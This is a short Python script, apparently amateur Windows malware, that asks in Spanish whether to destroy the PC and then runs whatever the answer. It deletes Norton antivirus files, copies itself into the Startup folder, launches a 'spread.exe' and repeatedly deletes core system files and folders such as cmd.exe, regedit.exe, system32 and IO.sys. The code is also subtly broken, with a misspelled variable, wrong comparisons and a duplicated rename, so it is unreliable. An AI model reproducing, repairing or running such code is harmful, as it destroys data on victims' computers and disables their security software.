from time import sleep
import os
import sys
import random

print("Estás seguro de que quieres destruir este PC? (Esto es irreversible) ¿S/n?")
if input() == "S":
    print("Comenzando...")

def nortonkill():
    os.remove('c:\\program files\\symantec shared')
    os.remove('c:\\program files\\Norton AntiVirus\\V32scan.dll')
    os.remove('c:\\program files\\Norton AntiVirus\\NavTasks.dll')
    copyplace()
 
def copyplace():    
    os.rename("c:\\habby.py","c:\\documents and settings\\all users\\Start Menu\\programs\\startup\\opennow.py")
    os.rename("c:\\habby.py","c:\\windows\\loop.py")
    os.system("start c:\spread.exe")
    explit()          
 
def explit():
    randfile = ['Program Files','Command','registry.exe','win.ini','System','system32']
    firstfile = random.choice(randfile)
    seconfile = random.choice(randfile)
    thirdfile = random.choice(randfile)
 
    if firstfile == 'Program Files':
        os.rmdir('c:\\program files')
 
    if firstfile == 'Command':
        os.remove('c:\\windows\\system32\\CMD.exe')
 
    if firstfile == 'registry.exe':
        os.remove('c:\\windows\\regedit.exe')
 
    if firstfile == 'win.ini':
        os.remove('c:\\windows\\win.ini')
        os.remove('c:\\windows\\winint.ini')
 
    if firstfile == 'System':
        os.rmdir('c:\\windows\\System')
        os.rmdir('c:\\windows\\fonts')
 
    if firstfiel == 'system32':
        os.rmdir('c:\\windows\\system32')
 
    if seconfile == 'Program Files':
        os.rmdir('c:\\Program Files')
 
    if seconfile == 'Command':
        os.remove('c:\\windows\\system32\\CMD.exe')
 
    if seconfile == 'registry.exe':
        os.remove('c:\\windows\\regedit.exe')
 
    if seconfile == 'win.ini':
        os.remove('c:\\windows\\win.ini')
        os.remove('c:\\windows\\winint.ini')
 
    if seconfile == 'System':
        os.rmdir('c:\\windows\\System')
        os.rmdir('c:\\windows\\fonts')
 
    if seconfile == 'system32':
        os.rmdir('c:\\windows\\system32')
        os.remove('c:\\windows\\system\\shell32.dll')
 
    if thirdfile == 'Program Files':
        os.rmdir('c:\\Program Files')
 
    if thirdfile == 'Command':
        os.remove('c:\\windows\\system32\\CMD.exe')
 
    if thirdfile == 'registry.exe':
        os.remove('c:\\windows\\regedit.exe')
 
    if thirdfile == 'win.ini':
        os.remove('c:\\windows\\win.ini')
        os.remove('c:\\windows\\winint.ini')
 
    if thirdfile == 'System':
        os.rmdir('c:\\windows\\System')
        os.rmdir('c:\\windows\\fonts')
 
    if thirdfile == 'system32':
        os.rmdir('c:\\windows\\system32')    
    sleep(3223)
    explit()
 
def randfile():
    filepick = ['I386','KKK','Juice']
    firstfilename = random.choice(filepick)
 
    if filepick == 'I386':
        os.rmdir('c:\\I386')
 
    if filepick == 'KKK':
        os.remove('c:\\hubby.py')
        os.rmdir('c:\\windows\\Twain_32')
 
    if filepick == 'Juice':
        os.remove('c:\\Autoexec.bat')
        os.remove('c:\\command.com')
        os.remove('c:\\IO.sys')  
    nortonkill()
    
randfile()